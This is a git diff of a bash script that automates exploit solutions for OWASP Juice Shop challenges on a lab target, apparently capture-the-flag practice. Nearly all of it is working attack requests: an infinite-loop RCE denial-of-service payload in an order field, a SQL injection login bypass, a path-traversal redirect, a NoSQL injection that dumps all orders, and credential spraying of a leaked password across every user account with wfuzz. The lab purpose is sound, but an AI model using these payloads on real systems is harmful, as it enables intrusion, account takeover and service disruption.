@@ -5,7 +5,7 @@ script=$(readlink -f $0)
 scriptpath=`dirname $script`
 
 # Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
-target_ip="10.10.206.114"
+target_ip="10.10.87.170"
 attack_ip="10.9.5.12"
 result_folder="/work/results/"
 
@@ -24,6 +24,15 @@ echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> $result_folder/5-cookie
 echo "\n$target_ip\tFALSE\t/\tFALSE\t0\tcookieconsent_status\tdismiss" >> $result_folder/5-cookies.txt
 
 
+# Perform a Remote Code Execution that would keep a less hardened application busy foreve
+echo "5.2 - BLOCKED RCE DOS"
+curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/5-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" -o $result_folder/5-admin.json
+ADMIN_TOKEN=$(jq -r '.authentication.token' $result_folder/5-admin.json)
+echo "--> Authenticated as admin with token $(echo "$ADMIN_TOKEN" | cut -c 1-20)...."
+cp $result_folder/5-cookies.txt $result_folder/5-admin-cookies.txt
+echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$ADMIN_TOKEN" >> $result_folder/5-admin-cookies.txt
+curl -s -X POST "http://$target_ip/b2b/v2/orders" -b "$result_folder/5-admin-cookies.txt" -L -H "Authorization: Bearer ${ADMIN_TOKEN}" -H "Content-Type: application/json" -d "{\"cid\":\"JS0815DE\",\"orderLines\":[{\"productId\":8,\"quantity\":500,\"customerReference\":\"PO0000001\"}],\"orderLinesData\":\"(function dos() { while(true); })()\"}" -o /dev/null
+
 # Change Bender's password into slurmCl4ssic without using SQL Injection or Forgot Password
 echo "5.3 - CHANGE BENDER'S PASSWORD"
 curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/5-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"bender@juice-sh.op'--\",\"password\":\"a\"}" -o $result_folder/5-bender.json
@@ -35,17 +44,15 @@ curl -s -X GET "http://$target_ip/rest/user/change-password?current=&new=slurmCl
 
 # Stick cute cross-domain kittens all over our delivery boxes.
 echo "5.4 - CROSS-SITE IMAGING"
-curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/5-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" -o $result_folder/5-admin.json
-ADMIN_TOKEN=$(jq -r '.authentication.token' $result_folder/5-admin.json)
-echo "--> Authenticated as admin with token $(echo "$ADMIN_TOKEN" | cut -c 1-20)...."
-cp $result_folder/5-cookies.txt $result_folder/5-admin-cookies.txt
-echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$ADMIN_TOKEN" >> $result_folder/5-admin-cookies.txt
 # This one makes kitten appear
+node $scriptpath/../../tools/playwright.js "http://$target_ip/#/deluxe-membership?testDecal=..%2F..%2F..%2Fredirect%3Fto%3Dhttp:%2F%2Fplacekittens.com%2Fg%2F400%2F500%3Fx%3Dhttp:%2F%2Fshop.spreadshirt.com%2Fjuiceshop" $result_folder/5-admin-cookies.txt > $result_folder/5-kittens.html 2> /dev/null
 node $scriptpath/../../tools/playwright.js "http://$target_ip/#/deluxe-membership?testDecal=..%2F..%2F..%2Fredirect%3Fto%3Dhttp:%2F%2Fplacekittens.com%2Fg%2F400%2F500%3Fx%3Dhttp:%2F%2Fshop.spreadshirt.com%2Fjuiceshop" $result_folder/5-admin-cookies.txt > $result_folder/5-kittens.html 2> /dev/null
 curl -X GET "http://$target_ip/#/deluxe-membership?testDecal=..%2F..%2F..%2Fredirect%3Fto%3Dhttp:%2F%2Fplacekittens.com%2Fg%2F400%2F500%3Fx%3Dhttp:%2F%2Fshop.spreadshirt.com%2Fjuiceshop" -b $result_folder/5-admin-cookies.txt -H "Authorization: Bearer ${ADMIN_TOKEN}"
 # This one solves the challenge
 node $scriptpath/../../tools/playwright.js "http://$target_ip/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttp:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttp:%2F%2Fshop.spreadshirt.com%2Fjuiceshop" $result_folder/5-admin-cookies.txt > $result_folder/5-kittens.html 2> /dev/null
+node $scriptpath/../../tools/playwright.js "http://$target_ip/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttp:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttp:%2F%2Fshop.spreadshirt.com%2Fjuiceshop" $result_folder/5-admin-cookies.txt > $result_folder/5-kittens.html 2> /dev/null
 curl -X GET "http://$target_ip/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttp:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttp:%2F%2Fshop.spreadshirt.com%2Fjuiceshop" -b $result_folder/5-admin-cookies.txt -H "Authorization: Bearer ${ADMIN_TOKEN}"
+
 
 # Retrieve the language file that never made it into production.
 echo "5.6 - EXTRA LANGUAGE"
@@ -66,6 +73,23 @@ echo "en_1337" >> $result_folder/5-languages.txt
 ffuf -u http://$target_ip//assets/i18n/FUZZ.json -w $result_folder/5-languages.txt -fs 1926 -o /tmp/5-languages.json
 jq '[.results[] | .input.FUZZ]' /tmp/5-languages.json > $result_folder/5-languages.json
 
+# Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to.
+echo "5.8 - LEAKED ACCESS LOG"
+curl -s -X GET "https://pastebin.com/raw/4U1V1UjU" -o $result_folder/5-4U1V1UjU.log
+LEAKED_PASSWORD=$(cat $result_folder/5-4U1V1UjU.log | sed -n 's/.*current=\(.*\)&new.*/\1/p' | sed "s@+@ @g;s@%@\\\\x@g" | xargs -0 printf "%b")
+echo "--> Leaked password is $LEAKED_PASSWORD"
+curl -s -X GET "http://$target_ip/rest/user/authentication-details" -b "$result_folder/5-admin-cookies.txt" -L -H "Authorization: Bearer ${ADMIN_TOKEN}" -o $result_folder/5-users.json
+USERS=$(jq -r '.data[].email' $result_folder/5-users.json)
+rm $result_folder/5-users.txt 2> /dev/null
+touch $result_folder/5-users.txt
+for i in $USERS; do
+    echo $i >> $result_folder/5-users.txt
+done
+wfuzz -c -z file,$result_folder/5-users.txt -v -d "{\"email\": \"FUZZ\", \"password\": \"$LEAKED_PASSWORD\"}" -H "Content-Type: application/json" -f $result_folder/5-wfuzz.txt --sc 200 --hc 401 http://$target_ip/rest/user/login
+
+# All your orders are belong to us! Even the ones which don't.
+echo "5.12 - NOSQL EXFILTRATION"
+curl -s -X GET "http://$target_ip/rest/track-order/'%20%7C%7C%20true%20%7C%7C%20'" -b "$result_folder/5-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -o $result_folder/5-orders.json 
 
 # Reset the password of Bjoern's internal account via the Forgot Password mechanism with the original answer to his security question.
 # From facebook => Uetersen => Preunification zipcode
